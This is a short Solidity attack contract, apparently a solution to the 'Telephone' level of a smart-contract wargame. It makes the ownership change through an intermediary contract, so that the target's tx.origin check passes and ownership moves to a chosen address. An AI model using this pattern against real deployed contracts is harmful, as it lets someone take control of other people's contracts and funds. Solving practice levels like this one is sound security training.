// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Telephone.sol";

contract AttackTelephone{
    Telephone public c;
    address public o;
    constructor(Telephone add,address own) public {
        o=own;
        c= add;
    }
    function change()public returns(uint256){
        c.changeOwner(o);
    }
}